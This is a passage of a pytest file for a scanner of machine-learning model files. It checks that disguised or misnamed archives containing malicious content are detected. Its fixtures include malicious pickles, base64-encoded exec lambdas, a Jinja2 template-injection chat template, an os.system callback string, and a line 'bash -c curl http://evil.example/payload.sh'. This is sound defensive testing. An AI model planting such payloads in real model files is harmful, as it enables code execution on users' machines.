        assert first.scanner_name == "jinja2_template"
        assert first.success is False
        assert second.success is False
        assert first.metadata["scan_outcome"] == "inconclusive"
        assert second.metadata["scan_outcome"] == "inconclusive"
        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
    finally:
        reset_cache_manager()


def test_scan_file_still_routes_malicious_zip_with_local_header(tmp_path: Path) -> None:
    disguised_zip = tmp_path / "payload.bin"
    _create_misnamed_zip(disguised_zip, {"payload.pkl": _build_malicious_pickle()})

    assert disguised_zip.read_bytes().startswith(b"PK\x03\x04")

    result = scan_file(str(disguised_zip))

    assert result.scanner_name == "zip"
    _assert_system_pickle_detected(result, "payload.pkl")


def test_scan_directory_preserves_parseable_prefixed_zip_with_central_directory_stub(tmp_path: Path) -> None:
    disguised_zip = tmp_path / "payload.jpg"
    _create_misnamed_zip(disguised_zip, {"payload.pkl": _build_malicious_pickle()})
    _prepend_stub(disguised_zip, b"PK\x01\x02stub-prefix")

    result = scan_model_directory_or_file(str(tmp_path))

    assert any(scanner_name == "zip" for scanner_name in result.scanner_names)
    assert any(
        issue.rule_code == "S201" and any(global_name in issue.message.lower() for global_name in _SYSTEM_GLOBAL_NAMES)
        for issue in result.issues
    )


def test_scan_model_omits_phase_timings_by_default(tmp_path: Path) -> None:
    payload = tmp_path / "payload.pkl"
    payload.write_bytes(pickle.dumps({"weights": [1, 2, 3]}))

    result = scan_model_directory_or_file(str(payload), cache_scan_results=False)

    assert not hasattr(result, "phase_timings")


def test_scan_model_emits_opt_in_phase_timings(tmp_path: Path) -> None:
    payload = tmp_path / "payload.pkl"
    payload.write_bytes(pickle.dumps({"weights": [1, 2, 3]}))

    result = scan_model_directory_or_file(str(payload), cache_scan_results=False, profile_timings=True)
    phase_timings = result.phase_timings  # type: ignore[attr-defined]

    assert phase_timings.keys() >= {
        "scanner_selection",
        "top_level_hashing",
        "file_scan_dispatch",
        "result_merge",
        "license_metadata",
        "result_consolidation",
        "commercial_use_warnings",
        "aggregate_hash",
    }
    assert all(duration >= 0 for duration in phase_timings.values())


def test_scan_file_detects_misnamed_gzip_wrapped_pickle_by_header(tmp_path: Path) -> None:
    disguised_gzip = tmp_path / "payload.jpg"
    disguised_gzip.write_bytes(gzip.compress(_build_malicious_pickle()))

    result = scan_file(str(disguised_gzip))

    assert result.scanner_name == "compressed"
    routing_checks = [check for check in result.checks if check.name == "Compressed Wrapper Inner Scanner Routing"]
    assert routing_checks
    assert routing_checks[0].details.get("inner_scanner") == "pickle"
    assert any(
        issue.severity == IssueSeverity.CRITICAL
        and issue.details.get("compressed_wrapper") == f"{disguised_gzip} -> payload.jpg.inner"
        and any(global_name in issue.message.lower() for global_name in _SYSTEM_GLOBAL_NAMES)
        for issue in result.issues
    ), f"Expected compressed inner pickle finding, got: {[(i.location, i.message, i.details) for i in result.issues]}"


def test_scan_file_detects_late_pickle_in_misnamed_concatenated_gzip(tmp_path: Path) -> None:
    disguised_gzip = tmp_path / "payload.jpg"
    disguised_gzip.write_bytes(gzip.compress(b"harmless prelude\n") + gzip.compress(_build_malicious_pickle()))

    result = scan_file(str(disguised_gzip))

    assert result.scanner_name == "compressed"
    assert result.metadata["compressed_member_count"] == 2
    assert any(
        issue.severity == IssueSeverity.CRITICAL
        and issue.details.get("compressed_wrapper") == f"{disguised_gzip} -> payload.jpg.inner#member-2"
        and any(global_name in issue.message.lower() for global_name in _SYSTEM_GLOBAL_NAMES)
        for issue in result.issues
    ), (
        "Expected late compressed-member pickle finding, got: "
        f"{[(i.location, i.message, i.details) for i in result.issues]}"
    )


def test_scan_file_does_not_route_compression_magic_near_match_to_compressed(tmp_path: Path) -> None:
    near_match = tmp_path / "payload.jpg"
    near_match.write_bytes(b"\x1f\x00not-a-gzip-stream")

    result = scan_file(str(near_match))

    assert result.scanner_name == "unknown"
    assert not [check for check in result.checks if check.name.startswith("Compressed Wrapper")]
    assert result.issues == []


def test_scan_file_does_not_route_pk_prefix_near_match_to_zip(tmp_path: Path) -> None:
    near_match = tmp_path / "payload.jpg"
    near_match.write_bytes(b"PKNO harmless text")

    result = scan_file(str(near_match))

    assert result.scanner_name == "unknown"
    assert not [check for check in result.checks if "ZIP" in check.name]
    assert result.issues == []


def test_scan_file_detects_shadowed_duplicate_pickle_in_misleading_zip(tmp_path: Path) -> None:
    disguised_zip = tmp_path / "payload.jpg"
    _create_zip_with_ordered_entries(
        disguised_zip,
        [
            ("payload.pkl", _build_malicious_pickle()),
            ("payload.pkl", pickle.dumps({"safe": True})),
        ],
    )

    result = scan_file(str(disguised_zip))

    assert result.scanner_name == "zip"
    _assert_system_pickle_detected(result, "payload.pkl")


def test_scan_file_detects_malicious_payload_in_skops_via_zip_pipeline(tmp_path: Path) -> None:
    skops_archive = tmp_path / "payload.skops"
    _create_misnamed_zip(skops_archive, {"payload.pkl": _build_malicious_pickle()})

    result = scan_file(str(skops_archive))

    assert result.scanner_name == "skops"
    assert any("payload.pkl" in (issue.location or "") for issue in result.issues)


def test_scan_file_routes_misnamed_skops_archive_by_schema_content(tmp_path: Path) -> None:
    disguised_skops = tmp_path / "payload.jpg"
    _create_misnamed_zip(
        disguised_skops,
        {
            "schema.json": json.dumps(
                {
                    "__class__": "Pipeline",
                    "__module__": "sklearn.pipeline",
                    "__loader__": "ObjectNode",
                    "_skops_version": "0.11.0",
                    "content": {},
                }
            ).encode("utf-8"),
            "payload.pkl": _build_malicious_pickle(),
        },
    )

    result = scan_file(str(disguised_skops))

    assert result.scanner_name == "skops"
    assert any("payload.pkl" in (issue.location or "") for issue in result.issues)


def test_scan_file_routes_misnamed_skops_archive_by_bare_schema_content(tmp_path: Path) -> None:
    disguised_skops = tmp_path / "payload-no-ext-schema.jpg"
    _create_misnamed_zip(
        disguised_skops,
        {
            "nested/schema": json.dumps(
                {
                    "__class__": "Pipeline",
                    "__module__": "sklearn.pipeline",
                    "__loader__": "ObjectNode",
                    "_skops_version": "0.11.0",
                    "content": {},
                }
            ).encode("utf-8"),
            "payload.pkl": _build_malicious_pickle(),
        },
    )

    result = scan_file(str(disguised_skops))

    assert result.scanner_name == "skops"
    _assert_system_pickle_detected(result, "payload.pkl")


def test_scan_file_does_not_route_nested_bare_schema_near_match_to_skops(tmp_path: Path) -> None:
    disguised_zip = tmp_path / "nested-schema-near-match.jpg"
    _create_misnamed_zip(
        disguised_zip,
        {
            "nested/schema": json.dumps(
                {
                    "__class__": "Pipeline",
                    "__module__": "sklearn.pipeline",
                    "__loader__": "ObjectNode",
                    "content": {},
                }
            ).encode("utf-8"),
        },
    )

    result = scan_file(str(disguised_zip))

    assert result.scanner_name == "zip"
    assert not any("CVE-2025-" in check.name for check in result.checks)


def test_scan_file_does_not_route_near_match_schema_zip_to_skops(tmp_path: Path) -> None:
    disguised_zip = tmp_path / "schema.jpg"
    _create_misnamed_zip(
        disguised_zip,
        {
            "schema.json": json.dumps(
                {
                    "__class__": "Pipeline",
                    "__module__": "sklearn.pipeline",
                    "__loader__": "ObjectNode",
                    "content": {},
                }
            ).encode("utf-8"),
        },
    )

    result = scan_file(str(disguised_zip))

    assert result.scanner_name == "zip"
    assert not any("CVE-2025-" in check.name for check in result.checks)


def test_scan_file_routes_oversized_misnamed_skops_schema_to_skops(tmp_path: Path) -> None:
    disguised_skops = tmp_path / "oversized-schema.jpg"
    schema = {
        "__class__": "Pipeline",
        "__module__": "sklearn.pipeline",
        "__loader__": "ObjectNode",
        "_skops_version": "0.11.0",
        "content": {},
        "padding": "x" * (4 * 1024 * 1024),
    }
    _create_misnamed_zip(
        disguised_skops,
        {
            "schema.json": json.dumps(schema).encode("utf-8"),
            "payload.pkl": _build_malicious_pickle(),
        },
    )

    result = scan_file(str(disguised_skops))

    assert result.scanner_name == "skops"
    assert any("payload.pkl" in (issue.location or "") for issue in result.issues)


def test_scan_file_handles_encrypted_skops_schema_without_routing_crash(tmp_path: Path) -> None:
    disguised_zip = tmp_path / "encrypted-schema.jpg"
    _create_misnamed_zip(
        disguised_zip,
        {
            "schema.json": json.dumps(
                {
                    "__class__": "Pipeline",
                    "__module__": "sklearn.pipeline",
                    "__loader__": "ObjectNode",
                    "_skops_version": "0.12.0",
                    "content": {},
                }
            ).encode("utf-8"),
        },
    )
    _mark_zip_entries_encrypted(disguised_zip)

    result = scan_file(str(disguised_zip))

    assert result.scanner_name == "zip"
    assert any("encrypted" in check.message.lower() for check in result.checks)


def test_scan_file_scans_clean_skops_without_nested_false_positives(tmp_path: Path) -> None:
    skops_archive = tmp_path / "clean.skops"
    _create_misnamed_zip(
        skops_archive,
        {
            "schema.json": json.dumps(
                {
                    "__class__": "Pipeline",
                    "__module__": "sklearn.pipeline",
                    "__loader__": "ObjectNode",
                    "_skops_version": "0.12.0",
                    "content": {},
                }
            ).encode("utf-8"),
            "metadata.json": b'{"name": "clean_model"}',
            "weights.bin": b"model weights",
        },
    )

    result = scan_file(str(skops_archive))

    assert result.scanner_name == "skops"
    assert result.success
    assert not result.issues


def test_scan_file_does_not_route_generic_zip_config_to_keras(tmp_path: Path) -> None:
    disguised_zip = tmp_path / "repo.jpg"
    _create_misnamed_zip(disguised_zip, {"config.json": json.dumps({"model_type": "bert"}).encode("utf-8")})

    result = scan_file(str(disguised_zip))

    assert result.scanner_name == "zip"
    assert not any(check.name.startswith("Keras ZIP") for check in result.checks)


def test_scan_file_routes_misnamed_keras_zip_by_content(tmp_path: Path) -> None:
    disguised_keras = tmp_path / "model.jpg"
    malicious_code = "exec(\"print('Malicious!')\")"
    encoded_code = base64.b64encode(malicious_code.encode()).decode()
    config = {
        "class_name": "Functional",
        "config": {
            "layers": [
                {"class_name": "InputLayer", "name": "input_1", "config": {}},
                {
                    "class_name": "Lambda",
                    "name": "lambda_1",
                    "config": {"function": [encoded_code, None, None], "function_type": "lambda"},
                },
            ]
        },
    }
    _create_misnamed_zip(
        disguised_keras,
        {
            "config.json": json.dumps(config).encode("utf-8"),
            "metadata.json": json.dumps({"keras_version": "3.0.0"}).encode("utf-8"),
        },
    )

    result = scan_file(str(disguised_keras))

    assert result.scanner_name == "keras_zip"
    assert any("lambda" in issue.message.lower() for issue in result.issues)


def test_scan_file_routes_misnamed_config_only_keras_zip_by_content(tmp_path: Path) -> None:
    disguised_keras = tmp_path / "model.jpg"
    malicious_code = "exec(\"print('Malicious!')\")"
    encoded_code = base64.b64encode(malicious_code.encode()).decode()
    config = {
        "class_name": "Functional",
        "config": {
            "layers": [
                {"class_name": "InputLayer", "name": "input_1", "config": {}},
                {
                    "class_name": "Lambda",
                    "name": "lambda_1",
                    "config": {"function": [encoded_code, None, None], "function_type": "lambda"},
                },
            ]
        },
    }
    _create_misnamed_zip(disguised_keras, {"config.json": json.dumps(config).encode("utf-8")})

    result = scan_file(str(disguised_keras))

    assert result.scanner_name == "keras_zip"
    assert any("lambda" in issue.message.lower() for issue in result.issues)


def test_scan_file_routes_misnamed_oversized_config_only_keras_zip_by_content(tmp_path: Path) -> None:
    disguised_keras = tmp_path / "model.jpg"
    malicious_code = "exec(\"print('Malicious!')\")"
    encoded_code = base64.b64encode(malicious_code.encode()).decode()
    config = {
        "class_name": "Functional",
        "config": {
            "layers": [
                {"class_name": "InputLayer", "name": "input_1", "config": {}},
                {
                    "class_name": "Lambda",
                    "name": "lambda_1",
                    "config": {"function": [encoded_code, None, None], "function_type": "lambda"},
                },
            ]
        },
        "padding": "A" * (5 * 1024 * 1024),
    }
    with zipfile.ZipFile(disguised_keras, "w", compression=zipfile.ZIP_DEFLATED) as archive:
        archive.writestr("config.json", json.dumps(config))

    result = scan_file(str(disguised_keras))

    assert result.scanner_name == "keras_zip"
    assert any("lambda" in issue.message.lower() for issue in result.issues)


def test_scan_file_does_not_route_misnamed_oversized_generic_config_to_keras(tmp_path: Path) -> None:
    disguised_zip = tmp_path / "repo.jpg"
    generic_config = {
        "model_type": "bert",
        "architectures": ["BertModel"],
        "padding": "A" * (5 * 1024 * 1024),
    }
    with zipfile.ZipFile(disguised_zip, "w", compression=zipfile.ZIP_DEFLATED) as archive:
        archive.writestr("config.json", json.dumps(generic_config))

    result = scan_file(str(disguised_zip))

    assert result.scanner_name == "zip"
    assert not any(check.name.startswith("Keras ZIP") for check in result.checks)


def test_scan_file_recursively_scans_embedded_pickle_in_content_routed_keras_zip(tmp_path: Path) -> None:
    disguised_keras = tmp_path / "model.jpg"
    _create_misnamed_zip(
        disguised_keras,
        {
            "config.json": json.dumps({"class_name": "Sequential", "config": {"layers": []}}).encode("utf-8"),
            "payload.pkl": _build_malicious_pickle(),
        },
    )

    result = scan_file(str(disguised_keras))

    assert result.scanner_name == "keras_zip"
    assert result.success is False
    _assert_system_pickle_detected(result, "payload.pkl")
    assert result.metadata.get("model_class") == "Sequential"


def test_scan_file_scans_shadowed_duplicate_pickle_members_in_content_routed_keras_zip(tmp_path: Path) -> None:
    disguised_keras = tmp_path / "model.jpg"
    _create_zip_with_ordered_entries(
        disguised_keras,
        [
            ("config.json", json.dumps({"class_name": "Sequential", "config": {"layers": []}}).encode("utf-8")),
            ("payload.pkl", _build_malicious_pickle()),
            ("payload.pkl", pickle.dumps({"safe": True})),
        ],
    )

    result = scan_file(str(disguised_keras))

    assert result.scanner_name == "keras_zip"
    assert result.success is False
    _assert_system_pickle_detected(result, "payload.pkl")


def test_scan_file_content_routed_keras_zip_with_benign_extra_member_stays_clean(tmp_path: Path) -> None:
    disguised_keras = tmp_path / "model.jpg"
    _create_misnamed_zip(
        disguised_keras,
        {
            "config.json": json.dumps({"class_name": "Sequential", "config": {"layers": []}}).encode("utf-8"),
            "notes.txt": b"safe archive member",
        },
    )

    result = scan_file(str(disguised_keras))

    assert result.scanner_name == "keras_zip"
    assert result.success is True
    assert result.issues == []


def test_scan_file_content_routed_keras_zip_with_benign_pickle_member_stays_clean(tmp_path: Path) -> None:
    disguised_keras = tmp_path / "model.jpg"
    _create_misnamed_zip(
        disguised_keras,
        {
            "config.json": json.dumps({"class_name": "Sequential", "config": {"layers": []}}).encode("utf-8"),
            "weights.pkl": pickle.dumps({"weights": [1, 2, 3], "bias": [0.1, 0.2]}),
        },
    )

    result = scan_file(str(disguised_keras))

    assert result.scanner_name == "keras_zip"
    assert result.success is True
    assert not any(issue.severity in (IssueSeverity.WARNING, IssueSeverity.CRITICAL) for issue in result.issues)


def test_scan_file_content_routed_keras_zip_with_duplicate_benign_pickle_members_stays_clean(tmp_path: Path) -> None:
    disguised_keras = tmp_path / "model.jpg"
    safe_payload = pickle.dumps({"weights": [1, 2, 3], "bias": [0.1, 0.2]})
    _create_zip_with_ordered_entries(
        disguised_keras,
        [
            ("config.json", json.dumps({"class_name": "Sequential", "config": {"layers": []}}).encode("utf-8")),
            ("weights.pkl", safe_payload),
            ("weights.pkl", safe_payload),
        ],
    )

    result = scan_file(str(disguised_keras))

    assert result.scanner_name == "keras_zip"
    assert result.success is True
    assert not any(issue.severity in (IssueSeverity.WARNING, IssueSeverity.CRITICAL) for issue in result.issues)


def test_scan_file_routes_config_only_keras_by_suffix(tmp_path: Path) -> None:
    keras_model = tmp_path / "model.keras"
    _create_misnamed_zip(
        keras_model,
        {
            "config.json": json.dumps({"class_name": "Sequential", "config": {"layers": []}}).encode("utf-8"),
        },
    )

    result = scan_file(str(keras_model))

    assert result.scanner_name == "keras_zip"
    assert result.success


def test_scan_file_routes_misnamed_pytorch_zip_by_content(tmp_path: Path) -> None:
    disguised_torch = tmp_path / "model.jpg"
    _create_misnamed_zip(
        disguised_torch,
        {
            "data.pkl": _build_malicious_pickle(),
            "version": b"1.6",
        },
    )

    result = scan_file(str(disguised_torch))

    assert result.scanner_name == "pytorch_zip"
    assert any("data.pkl" in (issue.location or "") for issue in result.issues)


@pytest.mark.parametrize(
    ("pickle_member", "storage_member"),
    [("data.pkl", "data/0"), ("archive/data.pkl", "archive/data/0")],
)
def test_scan_file_routes_misnamed_pytorch_zip_with_storage_but_no_metadata(
    tmp_path: Path,
    pickle_member: str,
    storage_member: str,
) -> None:
    disguised_torch = tmp_path / f"metadata-stripped-{pickle_member.replace('/', '-')}.jpg"
    _create_misnamed_zip(
        disguised_torch,
        {
            pickle_member: _build_malicious_pickle(),
            storage_member: b"tensor-storage",
        },
    )

    result = scan_file(str(disguised_torch))

    assert result.scanner_name == "pytorch_zip"
    assert any(pickle_member in (issue.location or "") for issue in result.issues)


@pytest.mark.parametrize(
    ("pickle_member", "near_storage_member"),
    [
        ("data.pkl", "data/readme.txt"),
        ("data.pkl", "data/0abc"),
        ("data.pkl", "data/weights.v2"),
        ("data.pkl", "data/0/readme.txt"),
        ("archive/data.pkl", "archive/data/readme.txt"),
        ("archive/data.pkl", "archive/data/0abc"),
        ("archive/data.pkl", "archive/data/weights.v2"),
        ("archive/data.pkl", "archive/data/0/readme.txt"),
    ],
)
def test_scan_file_does_not_route_generic_data_directory_to_pytorch_zip(
    tmp_path: Path,
    pickle_member: str,
    near_storage_member: str,
) -> None:
    disguised_zip = tmp_path / f"generic-data-dir-{pickle_member.replace('/', '-')}.jpg"
    _create_misnamed_zip(
        disguised_zip,
        {
            pickle_member: _build_malicious_pickle(),
            near_storage_member: b"not tensor storage",
        },
    )

    result = scan_file(str(disguised_zip))

    assert result.scanner_name == "zip"
    _assert_system_pickle_detected(result, pickle_member)


@pytest.mark.parametrize("suffix", [".pt", ".pth", ".ckpt", ".bin", ".pkl"])
def test_scan_file_routes_zip_backed_torch_suffix_collisions_to_pytorch_zip(
    tmp_path: Path,
    suffix: str,
) -> None:
    model_path = create_mock_pytorch_zip(tmp_path / f"weights{suffix}")

    result = scan_file(str(model_path), config={"cache_scan_results": False})

    assert result.scanner_name == "pytorch_zip"
    assert result.success is True
    assert result.metadata.get("pickle_files")


@pytest.mark.parametrize("suffix", [".pt", ".pth", ".ckpt", ".pkl"])
def test_scan_file_routes_raw_pickle_torch_suffix_collisions_to_pickle(
    tmp_path: Path,
    suffix: str,
) -> None:
    model_path = tmp_path / f"weights{suffix}"
    model_path.write_bytes(pickle.dumps({"weights": [1, 2, 3]}, protocol=4))

    result = scan_file(str(model_path), config={"cache_scan_results": False})

    assert result.scanner_name == "pickle"
    assert result.success is True


def test_scan_file_routes_jax_pickles_through_jax_specific_analysis(tmp_path: Path) -> None:
    model_path = tmp_path / "state.pickle"
    model_path.write_bytes(
        pickle.dumps(
            {
                "framework": "jax",
                "payload": "jax.experimental.io_callback",
            }
        )
    )

    result = scan_file(str(model_path), config={"cache_scan_results": False})

    assert result.scanner_name == "pickle"
    assert any(
        check.name == "JAX Pattern Security Check"
        and check.status == CheckStatus.FAILED
        and check.details["pattern"] == r"jax\.experimental\.io_callback"
        for check in result.checks
    )


def test_scan_file_routes_malicious_renamed_jax_json_without_routing_ajax_near_match(tmp_path: Path) -> None:
    model_path = tmp_path / "state.jpg"
    native_model_path = tmp_path / "state.checkpoint"
    near_match_path = tmp_path / "ajax.jpg"
    malicious_payload = (" " * 1024) + json.dumps(
        {
            "framework": "jax",
            "payload": "jax.experimental.host_callback.call(os.system, 'id')",
        }
    )
    model_path.write_text(malicious_payload, encoding="utf-8")
    native_model_path.write_text(malicious_payload, encoding="utf-8")
    near_match_path.write_text(
        json.dumps({"framework": "ajax", "payload": "jax.experimental.host_callback.call(os.system, 'id')"}),
        encoding="utf-8",
    )

    result = scan_file(str(model_path), config={"cache_scan_results": False})
    native_result = scan_file(str(native_model_path), config={"cache_scan_results": False})
    near_match_result = scan_file(str(near_match_path), config={"cache_scan_results": False})

    assert result.scanner_name == "jax_checkpoint"
    assert native_result.scanner_name == "jax_checkpoint"
    assert any(
        check.name == "JSON Pattern Security Check" and check.status == CheckStatus.FAILED for check in result.checks
    )
    assert any(
        check.name == "JSON Pattern Security Check" and check.status == CheckStatus.FAILED
        for check in native_result.checks
    )
    assert near_match_result.scanner_name == "unknown"
    assert near_match_result.success is True


def test_scan_file_fails_closed_for_oversized_renamed_jax_json_and_does_not_cache_result(tmp_path: Path) -> None:
    model_path = tmp_path / "large-state.jpg"
    near_match_path = tmp_path / "large-ajax.jpg"
    padding = "x" * (JAX_JSON_CHECKPOINT_STRUCTURE_READ_BYTES + 16)
    model_path.write_text(
        json.dumps(
            {
                "padding": padding,
                "framework": "jax",
                "payload": "jax.experimental.host_callback.call(os.system, 'id')",
            }
        ),
        encoding="utf-8",
    )
    near_match_path.write_text(json.dumps({"padding": padding, "framework": "ajax"}), encoding="utf-8")
    cache_dir = tmp_path / "cache"
    config = {
        "cache_enabled": True,
        "cache_dir": str(cache_dir),
        "min_cache_file_size": 0,
    }

    reset_cache_manager()
    try:
        first = scan_file(str(model_path), config=config)
        second = scan_file(str(model_path), config=config)
        near_match_result = scan_file(str(near_match_path), config={"cache_scan_results": False})

        assert first.scanner_name == "jax_checkpoint"
        assert first.success is False
        assert second.success is False
        assert first.metadata["scan_outcome"] == "inconclusive"
        assert "jax_json_checkpoint_analysis_size_limit" in first.metadata["scan_outcome_reasons"]
        assert near_match_result.scanner_name == "unknown"
        assert near_match_result.success is True
        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
    finally:
        reset_cache_manager()

    aggregate = scan_model_directory_or_file(str(model_path), cache_scan_results=False)
    assert core_module.determine_exit_code(aggregate) == 2


def test_scan_file_routes_raw_bin_without_zip_structure_to_pytorch_binary(tmp_path: Path) -> None:
    model_path = tmp_path / "weights.bin"
    model_path.write_bytes(b"\x00" * 128)

    result = scan_file(str(model_path), config={"cache_scan_results": False})

    assert result.scanner_name == "pytorch_binary"
    assert result.success is True


def test_preferred_scanner_does_not_route_generic_zip_bin_to_pickle(tmp_path: Path) -> None:
    model_path = tmp_path / "weights.bin"
    _create_misnamed_zip(model_path, {"metadata.txt": b"not a pickle"})

    assert core_module._select_preferred_scanner_id(str(model_path), "zip", ".bin") == "zip"


def test_scan_file_routes_misnamed_executorch_archive_by_content(tmp_path: Path) -> None:
    disguised_exec = tmp_path / "model.jpg"
    _create_misnamed_zip(
        disguised_exec,
        {
            "bytecode.pkl": pickle.dumps({"weights": [1, 2, 3]}),
            "version": b"1",
            "evil.py": b"print('evil')\n",
        },
    )

    result = scan_file(str(disguised_exec))

    assert result.scanner_name == "executorch"
    assert any(issue.rule_code == "S507" and "evil.py" in (issue.location or "") for issue in result.issues)
    assert any(issue.rule_code == "S104" and "evil.py" in (issue.location or "") for issue in result.issues)


def test_scan_file_does_not_route_non_pytorch_zip_with_generic_pickle(tmp_path: Path) -> None:
    disguised_zip = tmp_path / "weights.jpg"
    _create_misnamed_zip(
        disguised_zip,
        {
            "weights.pkl": pickle.dumps({"weights": [1, 2, 3]}),
            "version": b"1.0",
        },
    )

    result = scan_file(str(disguised_zip))

    assert result.scanner_name == "zip"


def test_scan_file_does_not_route_near_match_executorch_zip_without_numeric_version(tmp_path: Path) -> None:
    disguised_zip = tmp_path / "bytecode.jpg"
    _create_misnamed_zip(
        disguised_zip,
        {
            "bytecode.pkl": pickle.dumps({"weights": [1, 2, 3]}),
            "version": b"dev",
        },
    )

    result = scan_file(str(disguised_zip))

    assert result.scanner_name == "zip"


def test_scan_file_does_not_route_generic_data_pickle_without_pytorch_metadata(tmp_path: Path) -> None:
    disguised_zip = tmp_path / "data.jpg"
    _create_misnamed_zip(disguised_zip, {"data.pkl": pickle.dumps({"weights": [1, 2, 3]})})

    result = scan_file(str(disguised_zip))

    assert result.scanner_name == "zip"


def test_scan_file_routes_misnamed_torchserve_mar_by_content(tmp_path: Path) -> None:
    disguised_mar = tmp_path / "model.jpg"
    manifest = {
        "model": {
            "handler": "handler.py",
            "serializedFile": "model.pkl",
        }
    }
    _create_misnamed_zip(
        disguised_mar,
        {
            "MAR-INF/MANIFEST.json": json.dumps(manifest).encode("utf-8"),
            "handler.py": b"def handle(data, context):\n    return data\n",
            "model.pkl": _build_malicious_pickle(),
        },
    )

    result = scan_file(str(disguised_mar))

    assert result.scanner_name == "torchserve_mar"
    assert any("model.pkl" in (issue.location or "") for issue in result.issues)


def test_scan_file_routes_misnamed_keras_hdf5_by_header(tmp_path: Path) -> None:
    h5py = pytest.importorskip("h5py")

    disguised_h5 = tmp_path / "model.jpg"
    with h5py.File(disguised_h5, "w") as handle:
        handle.attrs["model_config"] = json.dumps(
            {
                "class_name": "Sequential",
                "config": {
                    "name": "test",
                    "layers": [{"class_name": "Lambda", "config": {"function": "lambda x: x * 2"}}],
                },
            }
        )
        handle.attrs["keras_version"] = "3.11.2"

    result = scan_file(str(disguised_h5))

    assert result.scanner_name == "keras_h5"
    assert any("CVE-2025-9905" in issue.message for issue in result.issues)


def test_scan_file_routes_misnamed_gguf_by_header(tmp_path: Path) -> None:
    disguised_gguf = create_mock_gguf(tmp_path / "model.payload")

    result = scan_file(str(disguised_gguf))

    assert result.scanner_name == "gguf"
    assert result.metadata["format"] == "gguf"


def test_scan_file_routes_gguf_chat_templates_through_jinja_analysis(tmp_path: Path) -> None:
    gguf_path = create_mock_gguf(
        tmp_path / "model.gguf",
        metadata={"tokenizer.chat_template": "{{ ''.__class__.__mro__[1].__subclasses__() }}"},
    )

    result = scan_file(str(gguf_path), config={"cache_scan_results": False})

    assert result.scanner_name == "gguf"
    assert any(
        check.name == "Jinja2 Template Injection Detection" and check.status == CheckStatus.FAILED
        for check in result.checks
    )


def test_scan_file_does_not_route_gguf_magic_near_match_to_gguf(tmp_path: Path) -> None:
    near_match = tmp_path / "model.payload"
    near_match.write_bytes(b"GGU?" + b"\x00" * 32)

    result = scan_file(str(near_match))

    assert result.scanner_name == "unknown"
    assert result.issues == []


def test_scan_file_routes_extensionless_llamafile(tmp_path: Path) -> None:
    extensionless_llamafile = tmp_path / "llama"
    extensionless_llamafile.write_bytes(b"\x7fELF" + b"\x02\x01\x01\x00" + b"\x00" * 56 + b"llamafile runtime")

    result = scan_file(str(extensionless_llamafile))

    assert result.scanner_name == "llamafile"


def test_scan_file_routes_extensionless_middle_marker_llamafile(tmp_path: Path) -> None:
    extensionless_llamafile = tmp_path / "llama"
    extensionless_llamafile.write_bytes(
        b"\x7fELF"
        + b"\x02\x01\x01\x00"
        + b"\x00" * 56
        + b"A" * (2 * 1024 * 1024 + 64)
        + b"llamafile runtime"
        + b"B" * (2 * 1024 * 1024 + 64)
    )

    result = scan_file(str(extensionless_llamafile))

    assert result.scanner_name == "llamafile"


def test_scan_file_detects_malicious_extensionless_middle_marker_llamafile(tmp_path: Path) -> None:
    extensionless_llamafile = tmp_path / "llama"
    extensionless_llamafile.write_bytes(
        b"\x7fELF"
        + b"\x02\x01\x01\x00"
        + b"\x00" * 56
        + b"A" * (2 * 1024 * 1024 + 64)
        + b"llamafile runtime\nbash -c curl http://evil.example/payload.sh"
        + b"B" * (2 * 1024 * 1024 + 64)
    )

    result = scan_file(str(extensionless_llamafile))

    assert result.scanner_name == "llamafile"
    assert any(issue.severity == IssueSeverity.CRITICAL for issue in result.issues)


def test_scan_file_detects_malicious_extensionless_llamafile(tmp_path: Path) -> None:
    extensionless_llamafile = tmp_path / "llama"
    extensionless_llamafile.write_bytes(
        b"\x7fELF"
        + b"\x02\x01\x01\x00"
        + b"\x00" * 56
        + b"llamafile runtime\nbash -c curl http://evil.example/payload.sh"
    )

    result = scan_file(str(extensionless_llamafile))

    assert result.scanner_name == "llamafile"
    assert any(issue.severity == IssueSeverity.CRITICAL for issue in result.issues)


def test_scan_file_does_not_route_extensionless_llamafile_near_match(tmp_path: Path) -> None:
    generic_executable = tmp_path / "tool"
    generic_executable.write_bytes(b"\x7fELF" + b"\x02\x01\x01\x00" + b"\x00" * 56 + b"llama-file runtime")

    result = scan_file(str(generic_executable))

    assert result.scanner_name == "unknown"
    assert result.issues == []


def test_scan_file_routes_middle_marker_llamafile_exe(tmp_path: Path) -> None:
    middle_marker = tmp_path / "middle-marker.exe"
    middle_marker.write_bytes(
        b"MZ" + b"\x00" * 62 + b"A" * (2 * 1024 * 1024 + 64) + b"llamafile runtime" + b"B" * (2 * 1024 * 1024 + 64)
    )

    result = scan_file(str(middle_marker))

    assert result.scanner_name == "llamafile"


def test_scan_file_routes_tail_marker_llamafile_exe(tmp_path: Path) -> None:
    tail_marker = tmp_path / "tail-marker.exe"
    tail_marker.write_bytes(b"MZ" + b"\x00" * 62 + b"A" * ((8 * 1024 * 1024) + 64) + b"llamafile runtime")

    result = scan_file(str(tail_marker))

    assert result.scanner_name == "llamafile"


def test_scan_file_routes_misnamed_onnx_by_header(tmp_path: Path) -> None:
    pytest.importorskip("onnx")
    disguised_onnx = tmp_path / "model.payload"
    create_mock_onnx(disguised_onnx)

    result = scan_file(str(disguised_onnx))

    assert result.scanner_name == "onnx"


def test_scan_file_routes_onnx_pb_by_content(tmp_path: Path) -> None:
    pytest.importorskip("onnx")
    onnx_pb = tmp_path / "model.pb"
    create_mock_onnx(onnx_pb)

    result = scan_file(str(onnx_pb))

    assert result.scanner_name == "onnx"
    assert not any(check.name == "Format Validation" for check in result.checks)


def test_scan_file_detects_malicious_onnx_pb_by_content(tmp_path: Path) -> None:
    pytest.importorskip("onnx")
    onnx_pb = tmp_path / "malicious.pb"
    create_mock_onnx(onnx_pb, op_type="PythonOp")

    result = scan_file(str(onnx_pb))

    assert result.scanner_name == "onnx"
    assert not any(check.name == "Format Validation" for check in result.checks)
    assert any(
        issue.severity == IssueSeverity.CRITICAL and issue.details.get("op_type") == "PythonOp"
        for issue in result.issues
    )


def test_scan_file_does_not_route_incidental_onnx_pb_string(tmp_path: Path) -> None:
    near_match = tmp_path / "metadata.pb"
    near_match.write_bytes(bytes([0x0A, 0x04]) + b"onnx" + b"\x00" * 16)

    result = scan_file(str(near_match))

    assert result.scanner_name != "onnx"
    assert not any(check.name == "Python Operator Detection" for check in result.checks)


def test_scan_file_fails_closed_when_recognized_format_scanner_is_unavailable(
